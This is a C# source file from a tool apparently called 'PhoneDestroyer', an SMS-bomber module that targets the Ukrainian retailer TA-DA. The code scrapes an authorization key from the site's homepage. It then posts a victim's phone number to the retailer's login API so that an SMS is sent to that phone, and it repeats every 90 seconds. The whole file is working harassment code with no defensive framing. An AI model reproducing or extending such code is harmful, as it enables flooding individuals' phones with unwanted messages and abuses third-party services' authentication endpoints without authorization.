using PhoneDestroyer.Utility;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace PhoneDestroyer.Services.UA
{
    internal class TADA : Service
    {
        public override string Name => "TA-DA.UA";

        public override CountryCodes AvailableFor => CountryCodes.UA;

        public override async Task<bool> SendSmsAsync()
        {
            var website = await Client.GetAsync("https://ta-da.ua/");
            var html = await website.Content.ReadAsStringAsync();
            var match = Regex.Match(html, "\"authorizationKey\":\"((\\\" |[^\"])*)\"");
            if (!match.Success)
            {
                if (LogDebug)
                    Logger.LogDebug("Не удалось найти authorizationToken для TA-DA.UA");
                return false;
            }
            var token = match.Groups[1].Value;
            var phone = "+38 (0" + PhoneNumber.Substring(0, 2) + ")" + " " + PhoneNumber.Substring(2, 3) +
                "-" + PhoneNumber.Substring(5, 2) + "-" + PhoneNumber.Substring(7, 2);
            var request = new HttpRequestMessage(HttpMethod.Post, "https://api.ta-da.net.ua/v1.1/mobile/user.auth");
            request.Content = new StringContent($"{{\"phone\":\"{phone}\"}}", Encoding.UTF8, "application/json");
            request.Headers.Authorization = new System.Net.Http.Headers.AuthenticationHeaderValue("Key", token);
            var resp = await Client.SendAsync(request);
            if (LogDebug)
            {
                Logger.LogDebug(await resp.Content.ReadAsStringAsync());
            }
            Delay = 90;
            return resp.IsSuccessStatusCode;
        }
    }
}
